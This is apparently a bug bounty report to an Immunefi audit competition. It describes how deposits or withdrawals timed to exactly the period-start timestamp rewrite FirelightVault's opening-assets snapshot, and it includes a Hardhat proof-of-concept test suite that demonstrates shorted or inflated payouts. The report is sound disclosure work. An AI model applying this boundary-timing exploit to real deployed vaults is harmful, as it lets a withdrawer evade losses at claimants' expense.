# 89659 sc medium exact period boundary deposits and withdrawals corrupt the opening assets checkpoint

**Submitted on Aug 20th 2026 at 12:16:19 UTC by @aksoy for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89659
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

FirelightVault treats totalAssetsAt(capturePeriodStart) as an immutable snapshot of assets committed at the beginning of a covered period. However, deposits and withdrawals executed with a block timestamp exactly equal to the period start write a checkpoint at that same timestamp. Because historical lookup is inclusive, these operations retroactively change the opening snapshot. A boundary withdrawal can reduce a fully funded incident payout and preserve the withdrawer’s assets, while a boundary deposit can increase the payout cap and expose newly deposited capital to losses that should have been limited by the original opening balance.

## Vulnerability Details

Incident payouts are capped using:

`uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);`

Checkpoint lookup includes values written exactly at capturePeriodStart. Deposits and withdrawals record updated assets using the current block timestamp: \`uint48 ts = Time.timestamp(); \_traceTotalAssets.push(ts, \_totalAssets);\`\`

Therefore, an withdraw or deposit executed exactly at periodStart changes the supposed opening snapshot.

## Impact Details

A user can arrange for a withdrawal transaction to execute at the exact period boundary can reduce the incident payout cap while keeping the withdrawn assets inside an economically valuable pending claim.

## References

<https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L892>

## Proof of Concept

## Proof of Concept

```js
const { loadFixture, time } = require("@nomicfoundation/hardhat-network-helpers");
const { deployVault } = require("./setup/fixtures.js");
const { expect } = require("chai");

async function setupVaultPayout(amount) {
  const ctx = await loadFixture(
    deployVault.bind(null, {
      decimals: 0n,
      initial_deposit_limit: 20n,
    }),
  );

  const user = ctx.users[0];
  await ctx.utils.mintAndApprove(amount, user);
  await ctx.firelight_vault.connect(user).deposit(amount, user.address);

  return ctx;
}

// The two tests below are identical in every respect except ONE: the timestamp of
// the withdrawal block. Shifting it by a single second changes the incident payout
// from 10 to 1. That single-variable difference is the proof.
describe("FirelightVault — capture-period opening snapshot is mutable at the boundary", function () {
  it("CONTROL: withdrawal at periodStart + 1 pays the full 10-asset claim", async () => {
    const { token_contract, firelight_vault, payout_signer, payout_receiver, users } =
      await setupVaultPayout(10n);

    const periodStart = await firelight_vault.currentPeriodEnd();
    expect(await firelight_vault.totalAssetsAt(periodStart)).to.equal(10n);

    // One second AFTER the boundary: the checkpoint is written at key periodStart+1,
    // which upperLookupRecent(periodStart) skips.
    await time.setNextBlockTimestamp(periodStart + 1n);
    await firelight_vault.connect(users[0]).withdraw(9n, users[0].address, users[0].address);

    const capturePeriod = await firelight_vault.currentPeriod();

    // Vault state is IDENTICAL to the exploit case below.
    expect(await firelight_vault.totalAssets()).to.equal(1n);
    expect(await firelight_vault.withdrawAssets(capturePeriod + 1n)).to.equal(9n);
    expect(await token_contract.balanceOf(firelight_vault.target)).to.equal(10n);

    // ...except the opening snapshot survived intact.
    expect(await firelight_vault.totalAssetsAt(periodStart)).to.equal(10n);

    await expect(firelight_vault.connect(payout_signer).payout(payout_receiver.address, 10n, periodStart))
      .to.emit(firelight_vault, "PayoutExecuted")
      .withArgs(payout_receiver.address, 10n, 10n, periodStart);

    // The claim is paid in full. The withdrawer absorbs their share of the loss.
    expect(await token_contract.balanceOf(payout_receiver.address)).to.equal(10n);
    expect(await firelight_vault.withdrawalsOf(capturePeriod + 1n, users[0].address)).to.equal(0n);
    expect(await token_contract.balanceOf(firelight_vault.target)).to.equal(0n);
  });

  it("EXPLOIT: the same withdrawal at exactly periodStart pays only 1, stranding 9 in the vault", async () => {
    const { token_contract, firelight_vault, payout_signer, payout_receiver, users } =
      await setupVaultPayout(10n);

    const periodStart = await firelight_vault.currentPeriodEnd();
    expect(await firelight_vault.totalAssetsAt(periodStart)).to.equal(10n);

    // The ONLY difference from CONTROL: this block lands exactly on the boundary,
    // so _logTrace writes at key == periodStart and the lookup returns it.
    await time.setNextBlockTimestamp(periodStart);
    await firelight_vault.connect(users[0]).withdraw(9n, users[0].address, users[0].address);

    const capturePeriod = await firelight_vault.currentPeriod();

    // Vault state is IDENTICAL to CONTROL...
    expect(await firelight_vault.totalAssets()).to.equal(1n);
    expect(await firelight_vault.withdrawAssets(capturePeriod + 1n)).to.equal(9n);
    expect(await token_contract.balanceOf(firelight_vault.target)).to.equal(10n);

    // ...but the opening snapshot has been rewritten from 10 to 1.
    expect(await firelight_vault.totalAssetsAt(periodStart)).to.equal(1n);

    await expect(firelight_vault.connect(payout_signer).payout(payout_receiver.address, 10n, periodStart))
      .to.emit(firelight_vault, "PayoutExecuted")
      .withArgs(payout_receiver.address, 10n, 1n, periodStart);

    // ── THE LOSS ──────────────────────────────────────────────────────────────
    // The claimant is shorted 9 of a 10-asset claim.
    expect(await token_contract.balanceOf(payout_receiver.address)).to.equal(1n);

    // Those 9 assets were never missing. They are still sitting in the vault,
    // and were fully inside activePayableAmount (1 active + 9 pending = 10).
    // Only the separately-evaluated opening cap kept them from being paid.
    expect(await token_contract.balanceOf(firelight_vault.target)).to.equal(9n);

    // The withdrawer keeps 8 of 9 instead of 0 — they evade ~89% of the loss.
    expect(await firelight_vault.withdrawalsOf(capturePeriod + 1n, users[0].address)).to.equal(8n);
    expect(await firelight_vault.withdrawAssets(capturePeriod + 1n)).to.equal(8n);
  });

  it("MIRROR: a deposit at exactly periodStart inflates the cap from 2 to 7", async () => {
    // The existing suite asserts ("caps payout to assets at the capture period start")
    // that a 5-asset deposit made AFTER capture start leaves the payout capped at 2.
    // Landing that same deposit ON the boundary second raises the cap to 7 instead —
    // the snapshot is mutable in both directions.
    const { token_contract, firelight_vault, payout_signer, payout_receiver, users, utils } =
      await setupVaultPayout(2n);

    const periodStart = await firelight_vault.currentPeriodEnd();
    expect(await firelight_vault.totalAssetsAt(periodStart)).to.equal(2n);

    await utils.mintAndApprove(5n, users[0]);
    await time.setNextBlockTimestamp(periodStart);
    await firelight_vault.connect(users[0]).deposit(5n, users[0].address);

    // Opening snapshot now includes capital that was not committed at period open.
    expect(await firelight_vault.totalAssetsAt(periodStart)).to.equal(7n);

    await expect(firelight_vault.connect(payout_signer).payout(payout_receiver.address, 7n, periodStart))
      .to.emit(firelight_vault, "PayoutExecuted")
      .withArgs(payout_receiver.address, 7n, 7n, periodStart);

    // 7 paid, versus 2 for the identical deposit made one second later.
    expect(await token_contract.balanceOf(payout_receiver.address)).to.equal(7n);
    expect(await firelight_vault.totalAssets()).to.equal(0n);
  });
});

```
